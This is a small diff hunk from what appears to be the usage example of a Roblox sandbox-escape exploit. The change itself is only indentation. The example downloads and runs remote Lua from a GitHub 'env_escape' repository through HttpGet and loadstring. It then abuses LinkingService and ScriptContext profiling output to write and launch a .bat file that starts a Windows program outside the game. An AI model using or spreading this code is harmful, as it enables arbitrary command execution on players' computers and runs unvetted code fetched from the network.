@@ -17,7 +17,7 @@ Full example:
 local bypassed_env, why, why_full = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
 
 if why ~= "Failed" and why ~= "UnSupported" then
-	local L, S = bypassed_env.game:GetService("LinkingService"), bypassed_env.game:GetService("ScriptContext")
+    local L, S = bypassed_env.game:GetService("LinkingService"), bypassed_env.game:GetService("ScriptContext")
     L:OpenUrl(S:SaveScriptProfilingData([[START C:\WINDOWS\system32\notepad.exe]], "lol.bat"))
 elseif why_full ~= nil then
     print(why_full)
